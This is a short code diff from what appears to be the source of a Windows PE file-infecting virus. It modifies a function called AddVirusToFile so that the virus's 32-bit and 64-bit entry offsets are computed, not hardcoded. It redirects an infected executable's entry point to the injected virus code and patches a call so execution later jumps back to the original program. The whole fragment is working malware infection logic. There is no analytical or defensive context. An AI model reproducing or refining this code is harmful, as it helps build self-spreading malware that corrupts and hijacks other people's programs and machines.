@@ -32,15 +32,23 @@ void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, const PDATA data, L
 
     if (Is64BitExecutable(file_data))
     {
-        DWORD entry_point_64bit = 0x28F0;
+        DWORD entry_point_64bit = *(DWORD *)((PUCHAR)data->this_file_base_address + virus_section->VirtualAddress + 4);
         SetEntryPoint(file_data, virus_va_in_target + entry_point_64bit);
-        *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 0x2945) = target_entry_point - (virus_va_in_target + 0x2949) ;
+        *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 
+                                            entry_point_64bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X64
+                ) = target_entry_point - (virus_va_in_target + 
+                                            entry_point_64bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X64 + sizeof(DWORD)
+                                ); 
     }
     else
     {
-        DWORD entry_point_32bit = 0xca0;
+        DWORD entry_point_32bit = *(DWORD *)((PUCHAR)data->this_file_base_address + virus_section->VirtualAddress);
         SetEntryPoint(file_data, virus_va_in_target + entry_point_32bit);
-        *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 0xcdc) = target_entry_point - (virus_va_in_target + 0xce0);
+        *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 
+                                            entry_point_32bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X86
+                ) = target_entry_point - (virus_va_in_target + 
+                                            entry_point_32bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X86 + sizeof(DWORD)
+                                        );
     }
 
     data->iat->fnVirtualFree(
